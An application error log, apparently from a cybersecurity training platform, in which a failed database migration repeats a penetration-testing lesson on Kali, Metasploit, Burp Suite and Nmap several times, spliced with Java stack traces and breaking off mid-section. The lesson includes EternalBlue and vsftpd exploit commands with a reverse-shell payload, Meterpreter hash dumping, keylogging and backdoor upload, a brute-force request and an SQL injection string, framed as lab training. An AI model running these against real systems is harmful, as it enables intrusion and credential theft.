Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:56:14.033 [vert.x-eventloop-thread-1] ERROR com.cyberskill.MainVerticle - ✗ Error during startup
java.lang.RuntimeException: Database migration failed
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:247)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 3 AND name = 'Penetration Testing Tools Overview'

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:243)
	... 13 common frames omitted
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

